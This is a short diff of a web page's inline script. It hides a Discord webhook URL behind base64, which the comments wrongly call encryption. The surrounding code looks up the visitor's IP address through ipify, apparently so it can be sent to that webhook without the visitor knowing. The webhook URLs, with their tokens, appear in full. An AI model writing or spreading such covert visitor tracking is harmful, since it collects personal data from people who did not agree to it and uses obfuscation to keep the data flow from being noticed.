@@ -100,7 +100,11 @@ html {
 </style>
   
 <script type="text/javascript">
-  const webhookUrl = 'https://canary.discord.com/api/webhooks/1087901929562177608/s3eLDEh0DbSpcNr-gDfCXee40TmR39CGapV_3uhIWH9S2807WZP6om61NW_Nl79QGnPA';
+  // Define the webhook URL as an encrypted string
+  const encryptedWebhookUrl = "aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEwODc5MDk1OTM2NTQ0OTc0MDEvdlk4MHFUNjQ1VW5yNS0tNTJidEpTcmpwbUpFUEU1Y3UxTTNzQldxd1pQT1JxTEQ4TWxOYTRxUi10YUZmV2ZuMllqS0s=";
+
+  // Decrypt the webhook URL and use it in the fetch request
+  const webhookUrl = atob(encryptedWebhookUrl);
 
   // Make a request to a free IP lookup service to obtain the user's IP address
   const apiUrl = 'https://api.ipify.org?format=json';
